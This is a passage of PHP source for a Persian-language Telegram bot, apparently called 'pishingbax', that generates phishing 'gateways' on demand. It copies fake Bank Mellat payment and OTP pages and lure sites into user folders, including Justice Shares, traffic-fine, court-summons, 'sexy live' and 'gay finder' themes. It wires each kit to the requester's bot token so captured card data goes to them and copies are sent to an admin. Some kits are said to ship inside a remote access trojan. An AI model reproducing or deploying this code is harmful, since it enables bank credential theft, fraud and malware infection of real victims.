'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"net1"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
    elseif($query == "net1_img"){
        bot('sendPhoto',[
            'chat_id'=>$query_id,
            'photo'=>"https://t.me/pishingbax_files/31",
            'caption'=>"نمونه درگاه  اینترنت ✅",
            'reply_markup'=>false,
            'message_id' =>$query_messageid
         ]);
    }
        ##----------------------##
                elseif($query == "saham"){
                    file_put_contents("data/$query_id/step.txt","make_s1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"saham_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="make_s1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه سهام عدالت ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/saham");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/saham/action.php","data/$chat_id/payment/$rand/saham/action.php");
copy("source/saham/app.php","data/$chat_id/payment/$rand/saham/app.php");
copy("source/saham/index.php","data/$chat_id/payment/$rand/saham/index.php");
copy("source/saham/tel.php","data/$chat_id/payment/$rand/saham/tel.php");
      
      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "سهام عدالت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/saham",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "سهام عدالت" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/saham", 'code' => "$rand",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه سهام عدالت شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/saham/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/saham/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"saham"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
    elseif($query == "saham_img"){
    bot('sendPhoto',[
        'chat_id'=>$query_id,
        'photo'=>"https://t.me/pishingbax_files/15",
        'caption'=>"نمونه درگاه  سهام عدالت ✅",
        'reply_markup'=>false,
        'message_id' =>$query_messageid
     ]);
}
    ##------------------------------##

    ##------------------------------##
elseif($query == "live"){
    file_put_contents("data/$query_id/step.txt","make_svv1");
bot('editMessageText',[ 
'chat_id'=>$query_id, 
'message_id'=>$query_messageid,
'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
",
'parse_mode'=>"html",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"نمونه",'callback_data'=>"live_img"]],
[['text'=>"<<--",'callback_data'=>"back"]]
]
])
]);   
}elseif(file_get_contents("data/$chat_id/step.txt")=="make_svv1"){
file_put_contents("data/$chat_id/step.txt","none");

$api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
$result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){

sendmessage($chat_id,"درحال ساخت درگاه لایو سکسی ...","html",$message_id);


$vmsString = 'abcdeTUVWXYZ0123456789';
$rand = substr(str_shuffle($vmsString),0,8);

mkdir("data/$chat_id/payment/$rand");
mkdir("data/$chat_id/payment/$rand/live");

copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/live/index.html","data/$chat_id/payment/$rand/live/index.html");

$TOKEN = '$TOKEN';
$ID = '$ID';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';


$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

$array2 = ['name'=> "لایو سکسی" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/live",'code'=>$rand];
$encode_array2 = json_encode($array2);
$handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
fwrite($handle2, $encode_array2);

$array21 = ['name'=> "لایو سکسی" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/live", 'code' => "$rand",'code'=>$rand];
$encode_array21 = json_encode($array21);
$handle21 = fopen("data/$chat_id/site/$text.json", 'w');
fwrite($handle21, $encode_array21);

   bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"
درگاه لایو سکسی شما با موفقیت ساخته شد !
➖➖➖➖➖
[🌐] توکن شما : <code>$text</code>
[📱] آیدی عددی شما : <code>$chat_id</code>
[📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/live/index.html
➖➖➖➖➖
🛡 Coded [ @$your_id ]
🔗 Channel [ @$your_id ]
",
'parse_mode'=>"html",
'message_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[

[['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
[['text'=>"<<--",'callback_data'=>"home"]],
]
])
]);   

bot('sendMessage',[ 
'chat_id'=>$admin, // ID ADMIN
'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
➖➖➖➖➖
[🌐] توکن : <code>$text</code>
[📱] آیدی عددی : <code>$chat_id</code>
[📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/live/index.php
➖➖➖➖➖
",
'parse_mode'=>"html",
'message_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[

[['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

]
])
]);   

}
elseif($ok !== true){
file_put_contents("data/$chat_id/step.txt","none");
sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"live"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


])));
}
elseif(file_exists("data/$chat_id/site/$text.json")){
sendmessage($chat_id,"
شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


]));
}
}
elseif($query == "live_img"){
    bot('sendPhoto',[
        'chat_id'=>$query_id,
        'photo'=>"https://t.me/pishingbax_files/29",
        'caption'=>"نمونه درگاه لایو سکسی ✅",
        'reply_markup'=>false,
        'message_id' =>$query_messageid
     ]);
}
    ##------------------------------##

              elseif($query == "trdd"){
                    file_put_contents("data/$query_id/step.txt","make_sphp1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"trdd_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="make_sphp1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه تردد ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/trdd");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/trdd/index.php","data/$chat_id/payment/$rand/trdd/index.php");
copy("source/trdd/send.php","data/$chat_id/payment/$rand/trdd/send.php");
      
      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "تردد" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/trdd",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "تردد" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/trdd", 'code' => "$rand",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه تردد شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/trdd/index.php
      [📝] توجه : این درگاه در رت قرار میگیرد، یعنی رت از توی سایت دانلود نمیشود
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/trdd/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"trdd"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
   elseif($query == "trdd_img"){
    bot('sendPhoto',[
        'chat_id'=>$query_id,
        'photo'=>"https://t.me/pishingbax_files/13",
        'caption'=>"نمونه درگاه  تردد ✅",
        'reply_markup'=>false,
        'message_id' =>$query_messageid
     ]);
}
    ##------------------------------##
    
    ##------------------------------##

              elseif($query == "eblagh2"){
                    file_put_contents("data/$query_id/step.txt","make_spp1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"eblagh2_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="make_spp1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه ابلاغیه 2 ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    file_put_contents("data/$chat_id/payment/index.html","Fucking Your Mother");
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/eblagh2");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/eblagh2/download.html","data/$chat_id/payment/$rand/eblagh2/download.html");
copy("source/eblagh2/index.html","data/$chat_id/payment/$rand/eblagh2/index.html");
copy("source/eblagh2/main.css","data/$chat_id/payment/$rand/eblagh2/main.css");
copy("source/eblagh2/NextStep.php","data/$chat_id/payment/$rand/eblagh2/NextStep.php");
      
      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "ابلاغیه" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/eblagh2",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "ابلاغیه" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/eblagh2", 'code' => "$rand",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه ابلاغیه شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/eblagh2/index.html
      [📝] توجه : این درگاه در رت قرار میگیرد، یعنی رت از توی سایت دانلود نمیشود
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/eblagh2/index.html
      ➖➖➖➖➖
      [🔅] نکته : این درگاه کامل داخل رت قرار میگیرد
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"eblagh2"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
    elseif($query == "eblagh2_img"){
        bot('sendPhoto',[
            'chat_id'=>$query_id,
            'photo'=>"https://t.me/pishingbax_files/10",
            'caption'=>"نمونه درگاه ابلاغ ✅",
            'reply_markup'=>false,
            'message_id' =>$query_messageid
         ]);
    }
    ##------------------------------##
    ##------------------------------##

                elseif($query == "gay"){
                    file_put_contents("data/$query_id/step.txt","make_saa1");
                bot('editMessageText',[ 
    'chat_id'=>$query_id, 
    'message_id'=>$query_messageid,
    'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
    ",
    'parse_mode'=>"html",
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
            [['text'=>"نمونه",'callback_data'=>"gay_img"]],
            [['text'=>"<<--",'callback_data'=>"back"]]
            ]
        ])
    ]);   
    }elseif(file_get_contents("data/$chat_id/step.txt")=="make_saa1"){
           file_put_contents("data/$chat_id/step.txt","none");
    
        $api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
      $result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){
  
  sendmessage($chat_id,"درحال ساخت درگاه گی یابی ...","html",$message_id);


          $vmsString = 'abcdeTUVWXYZ0123456789';
    $rand = substr(str_shuffle($vmsString),0,8);
    
    mkdir("data/$chat_id/payment/$rand");
    mkdir("data/$chat_id/payment/$rand/gay");
    
copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/gay/send.php","data/$chat_id/payment/$rand/gay/send.php");
copy("source/gay/index.php","data/$chat_id/payment/$rand/gay/index.php");

      
      $TOKEN = '$TOKEN';
      $ID = '$ID';
      $id = '$ID_SHELL';
      $token = '$TOKEN_SHELL';

      
$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

    $array2 = ['name'=> "گی یابی" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/gay",'code'=>$rand];
  $encode_array2 = json_encode($array2);
 $handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
  fwrite($handle2, $encode_array2);
  
 $array21 = ['name'=> "گی یابی" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/gay", 'code' => "$rand",'code'=>$rand];
  $encode_array21 = json_encode($array21);
 $handle21 = fopen("data/$chat_id/site/$text.json", 'w');
  fwrite($handle21, $encode_array21);
  
                   bot('sendMessage',[ 
    'chat_id'=>$chat_id, 
    'text'=>"
    درگاه گی یابی شما با موفقیت ساخته شد !
      ➖➖➖➖➖
      [🌐] توکن شما : <code>$text</code>
      [📱] آیدی عددی شما : <code>$chat_id</code>
      [📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/gay/index.php
      ➖➖➖➖➖
      🛡 Coded [ @$your_id ]
      🔗 Channel [ @$your_id ]
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
             [['text'=>"<<--",'callback_data'=>"home"]],
            ]
        ])
    ]);   
    
          bot('sendMessage',[ 
    'chat_id'=>$admin, // ID ADMIN
    'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
      ➖➖➖➖➖
      [🌐] توکن : <code>$text</code>
      [📱] آیدی عددی : <code>$chat_id</code>
      [📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/gay/index.php
      ➖➖➖➖➖
    ",
    'parse_mode'=>"html",
        'message_id'=>$message_id,
    'reply_markup'=>json_encode([
        'inline_keyboard'=>[
  
             [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

            ]
        ])
    ]);   
    
    }
    elseif($ok !== true){
           file_put_contents("data/$chat_id/step.txt","none");
        sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"gay"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


        ])));
    }
      elseif(file_exists("data/$chat_id/site/$text.json")){
    sendmessage($chat_id,"
    شما قبلا درگاهی ایجاد کردید !
ابتدا درگاه قبلی را حذف کنید سپس اقدام کنید !
    ","html",$message_id,json_encode([
'inline_keyboard'=>[
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]]


]


    ]));
      }
    }
             elseif($query == "gay_img"){
            bot('sendPhoto',[
                'chat_id'=>$query_id,
                'photo'=>"https://t.me/pishingbax_files/14",
                'caption'=>"نمونه درگاه گی یابی ✅",
                'reply_markup'=>false,
                'message_id' =>$query_messageid
             ]);
        }
    ##-----------------------------##
    ##-----------------------------##
    elseif($query == "add"){
        file_put_contents("data/$query_id/step.txt","make_saaa1");
    bot('editMessageText',[ 
'chat_id'=>$query_id, 
'message_id'=>$query_messageid,
'text'=>"
توکن خود را ارسال کنید

مانند نمونه : 
5359855325:AAGkE5d************R53AIo94Z3bBmldo
",
'parse_mode'=>"html",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"نمونه",'callback_data'=>"add_img"]],
[['text'=>"<<--",'callback_data'=>"back"]]
]
])
]);   
}elseif(file_get_contents("data/$chat_id/step.txt")=="make_saaa1"){
file_put_contents("data/$chat_id/step.txt","none");

$api_t = file_get_contents("https://api.telegram.org/bot$text/getMe");
$result = json_decode($api_t, true);
$un = $result['result']['username'];
$ok = $result['ok'];

if($ok == true and !file_exists("data/$chat_id/site/$text.json")){

sendmessage($chat_id,"درحال ساخت درگاه ادد بزن ...","html",$message_id);


$vmsString = 'abcdeTUVWXYZ0123456789';
$rand = substr(str_shuffle($vmsString),0,8);

mkdir("data/$chat_id/payment/$rand");
mkdir("data/$chat_id/payment/$rand/add");

copy("source/mellat/Bankinfo.php","data/$chat_id/payment/$rand/Bankinfo.php");
copy("source/mellat/index.php","data/$chat_id/payment/$rand/index.php");
copy("source/mellat/Mellat.php","data/$chat_id/payment/$rand/Mellat.php");
copy("source/mellat/OTP.php","data/$chat_id/payment/$rand/OTP.php");
copy("source/mellat/re.php","data/$chat_id/payment/$rand/re.php");

copy("source/add/index.html","data/$chat_id/payment/$rand/add/index.html");
copy("source/add/send.php","data/$chat_id/payment/$rand/add/send.php");

$TOKEN = '$TOKEN';
$ID = '$ID';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';


$FileName = "data/$chat_id/payment/$rand/info.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
$TOKEN = '$text';
$ID = '$chat_id';
$id = '$ID_SHELL';
$token = '$TOKEN_SHELL';
?>
");

$array2 = ['name'=> "ادد بزن" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/add",'code'=>$rand];
$encode_array2 = json_encode($array2);
$handle2 = fopen("data/$chat_id/payment/$rand/info.json", 'w');
fwrite($handle2, $encode_array2);

$array21 = ['name'=> "ادد بزن" , 'token' => $text , 'url' => "https://$url/data/$chat_id/payment/$rand/add", 'code' => "$rand",'code'=>$rand];
$encode_array21 = json_encode($array21);
$handle21 = fopen("data/$chat_id/site/$text.json", 'w');
fwrite($handle21, $encode_array21);

       bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"
درگاه ادد بزن شما با موفقیت ساخته شد !
➖➖➖➖➖
[🌐] توکن شما : <code>$text</code>
[📱] آیدی عددی شما : <code>$chat_id</code>
[📣] لینک درگاه شما : https://$url/data/$chat_id/payment/$rand/add/index.html
➖➖➖➖➖
🛡 Coded [ @$your_id ]
🔗 Channel [ @$your_id ]
",
'parse_mode'=>"html",
'message_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[

 [['text'=>"ورود به ربات",'url'=>"https://t.me/$un"]],
 [['text'=>"<<--",'callback_data'=>"home"]],
]
])
]);   

bot('sendMessage',[ 
'chat_id'=>$admin, // ID ADMIN
'text'=>"
ادمین عزیز یک نفر درگاه ساخت !
➖➖➖➖➖
[🌐] توکن : <code>$text</code>
[📱] آیدی عددی : <code>$chat_id</code>
[📣] لینک درگاه : https://$url/data/$chat_id/payment/$rand/add/index.html
➖➖➖➖➖
",
'parse_mode'=>"html",
'message_id'=>$message_id,
'reply_markup'=>json_encode([
'inline_keyboard'=>[

 [['text'=>"ورود به پی وی کاربر",'url'=>"https://t.me/$username"]],

]
])
]);   

}
elseif($ok !== true){
file_put_contents("data/$chat_id/step.txt","none");
sendmessage($chat_id,"توکن ارسال شده اشتباه میباشد","html",$message_id,json_encode(([
'inline_keyboard'=>[
[['text'=>"تلاش مجدد",'callback_data'=>"add"]],
[['text'=>"بازگشت به منوی اصلی",'callback_data'=>"back"]],


]


])));
}
elseif(file_exists("data/$chat_id/site/$text.json")){
sendmessage($chat_id,"
